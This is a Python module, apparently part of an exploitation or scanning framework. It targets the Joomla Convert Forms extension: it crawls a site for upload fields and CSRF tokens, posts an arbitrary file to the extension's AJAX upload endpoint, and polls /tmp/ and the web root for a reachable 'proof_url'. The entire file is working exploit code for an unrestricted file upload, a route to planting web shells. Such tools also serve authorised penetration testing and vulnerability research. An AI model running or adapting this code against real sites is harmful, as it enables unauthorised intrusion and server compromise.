from __future__ import annotations

import base64
import re
import urllib.parse
from pathlib import PurePath
from typing import Any

from ...core.http import HttpSession, poll_paths


def _attrs(tag: str) -> dict[str, str]:
    return {key.lower(): value for key, _, value in re.findall(r"([\w:-]+)\s*=\s*(['\"])(.*?)\2", tag, re.DOTALL)}


def _form_upload_fields(html: str) -> list[tuple[str, str, str | None]]:
    forms: list[tuple[str, str, str | None]] = []
    for block in re.findall(r"<form\b.*?</form>", html, re.IGNORECASE | re.DOTALL):
        form_id = re.search(
            r"name\s*=\s*['\"]cf\[form_id\]['\"][^>]*value\s*=\s*['\"]([^'\"]+)",
            block,
            re.IGNORECASE,
        )
        if not form_id:
            continue
        token = re.search(
            r"<input\b[^>]*name\s*=\s*['\"]([a-f0-9]{32})['\"][^>]*value\s*=\s*['\"]1['\"]",
            block,
            re.IGNORECASE,
        )
        for tag in re.findall(r"<[^>]+\bclass\s*=\s*['\"][^'\"]*cfupload[^'\"]*['\"][^>]*>", block, re.IGNORECASE):
            field_key = _attrs(tag).get("data-key")
            if field_key:
                forms.append((form_id.group(1), field_key, token.group(1) if token else None))
    return forms


def _candidate_pages(session: HttpSession, target: str) -> list[tuple[str, str]]:
    root = session.get("/")
    pages = [(target.rstrip("/") + "/", root.get("body", ""))]
    if root.get("status") != 200:
        return pages
    origin = urllib.parse.urlsplit(target)
    seen = {pages[0][0]}
    for href in re.findall(r"href\s*=\s*['\"]([^'\"#]+)", root.get("body", ""), re.IGNORECASE):
        url = urllib.parse.urljoin(pages[0][0], href)
        parsed = urllib.parse.urlsplit(url)
        if parsed.netloc != origin.netloc or url in seen:
            continue
        seen.add(url)
        response = session.get(url)
        if response.get("status") == 200:
            pages.append((url, response.get("body", "")))
        if len(pages) >= 20:
            break
    return pages


def discover_upload_fields(session: HttpSession, target: str) -> list[tuple[str, str, str | None, str]]:
    found = []
    for page_url, html in _candidate_pages(session, target):
        for form_id, field_key, token in _form_upload_fields(html):
            found.append((form_id, field_key, token, page_url))
    return list(dict.fromkeys(found))


def _uploaded_basename(body: str) -> str | None:
    match = re.search(r"\{[^{}]*\"file\"\s*:\s*\"([^\"]+)\"[^{}]*\}", body)
    if not match:
        return None
    try:
        path = base64.b64decode(match.group(1), validate=True).decode("utf-8", errors="replace")
    except (ValueError, UnicodeError):
        return None
    return PurePath(path.replace("\\", "/")).name or None


def probe_upload(
    target: str,
    *,
    filename: str,
    payload: bytes,
    content_type: str,
    timeout: int,
    proxy: str | None,
) -> dict[str, Any]:
    session = HttpSession(target, timeout=timeout, proxy=proxy)
    fields = discover_upload_fields(session, target)
    attempts = []
    for form_id, field_key, token, page_url in fields:
        request_fields = {"form_id": form_id, "field_key": field_key}
        headers = {}
        if token:
            request_fields[token] = "1"
            headers["X-CSRF-Token"] = token
        upload = session.post(
            "/index.php?option=com_convertforms&task=field.ajax&field_type=fileupload",
            fields=request_fields,
            files={"file": (filename, payload, content_type)},
            headers=headers,
        )
        basename = _uploaded_basename(upload.get("body", ""))
        attempts.append(f"form={form_id},field={field_key},status={upload.get('status', 0)}")
        if not basename:
            continue
        response, path, polls = poll_paths(
            lambda candidate: session.get(candidate),
            [f"/tmp/{basename}", f"/{basename}"],
            deadline=2.5,
            initial_delay=0.1,
        )
        if response and path:
            return {
                "accepted": True,
                "response": response,
                "proof_url": f"{target.rstrip('/')}{path}",
                "uploaded_filename": basename,
                "page_url": page_url,
                "polls": polls,
                "attempts": attempts,
            }
    return {"accepted": False, "fields_found": len(fields), "attempts": attempts}
